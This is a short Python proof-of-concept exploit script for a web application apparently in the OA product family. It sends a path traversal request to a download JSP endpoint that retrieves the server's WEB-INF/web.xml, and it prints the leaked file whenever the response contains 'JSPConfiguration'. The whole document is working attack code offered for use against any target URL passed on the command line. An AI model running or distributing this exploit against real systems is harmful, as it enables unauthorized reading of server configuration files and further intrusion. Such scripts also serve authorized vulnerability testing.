#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import requests
import urllib3
import sys
import time
import json
import re
from datetime import datetime, timedelta

urllib3.disable_warnings()

def verify(site):
    burp0_url = site + "/defaultroot/public/download/download_old.jsp;?path=..&name=web.xml&FileName=WEB-INF/web.xml"
    burp0_headers = {"User-Agent": "Moziilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0", "Content-Type": "application/x-www-form-urlencoded"}
    r = requests.get(burp0_url, headers=burp0_headers, verify=False)
    if r.status_code == 200 and "JSPConfiguration" in r.text:
        return r.text[:1000]
    return ""


    
if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，读取文件 web.xml 的内容为：", info)
    else:
        print("[-]漏洞不存在")
